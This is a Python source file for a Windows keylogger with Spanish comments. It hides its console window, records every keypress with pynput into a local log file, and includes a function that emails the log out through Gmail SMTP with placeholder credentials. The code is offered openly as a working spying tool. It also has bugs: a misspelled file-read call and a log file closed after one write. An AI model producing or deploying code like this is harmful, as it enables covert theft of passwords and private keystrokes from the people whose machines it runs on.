#!/usr/bin/env python
# -*- coding: utf-8 -*-

import pynput.keyboard
import smtplib
import time 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import win32console
import win32gui

ventana = win32console.GetConsoleWindow()
win32gui.ShowWindow(ventana,0)

# Lista para almacenar las teclas presionadas
lista_tecla = []
log_file = open('log.txt','w+')

def enviar_datos():
    msg = MIMEMultipart()
    password = "My_password"
    msg['From'] = "example@example.com"
    msg['To'] = "example@example.com"
    msg['Subject'] = "Keylogger Prueba"
    msg.attach(MIMEText(file('log.txt').red()))

    try:
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(msg['From'],password)
        server.sendmail(msg['From'],msg['To'],msg.as_string())
        server.quit()
    except:
        pass

def imprimir():
    """Función para imprimir las teclas almacenadas."""
    teclas = ''.join(lista_tecla)
    log_file.write(teclas)
    log_file.write('\n')
    log_file.close()

def convertir(key):
    """Convierte la tecla a un formato específico (cadena de texto)."""
    try:
        # Intenta obtener el carácter asociado a la tecla (si es alfanumérica)
        return key.char
    except AttributeError:
        # Si no es un carácter, devuelve la representación de la tecla
        return str(key)

def presiona(key):
    """Función que se llama cuando se presiona una tecla."""
    key_str = convertir(key)
    
    if key_str == "Key.esc":
        print("Saliendo...")
        imprimir()
        return False  # Detiene el listener
    elif key_str == "Key.space":
        lista_tecla.append(' ')  # Agrega un espacio en blanco para Key.space
    elif key_str == "Key.enter":
        lista_tecla.append('\n')
    elif key_str == 'Key.backspace':
        pass
    elif key_str == 'Key.tab':
        pass
    elif key_str == 'Key.shift':
        pass
    else:
        lista_tecla.append(key_str)

def main():
    """Función principal para iniciar la escucha de teclado."""
    with pynput.keyboard.Listener(on_press=presiona) as listener:
        listener.join()

if __name__ == "__main__":
    main()
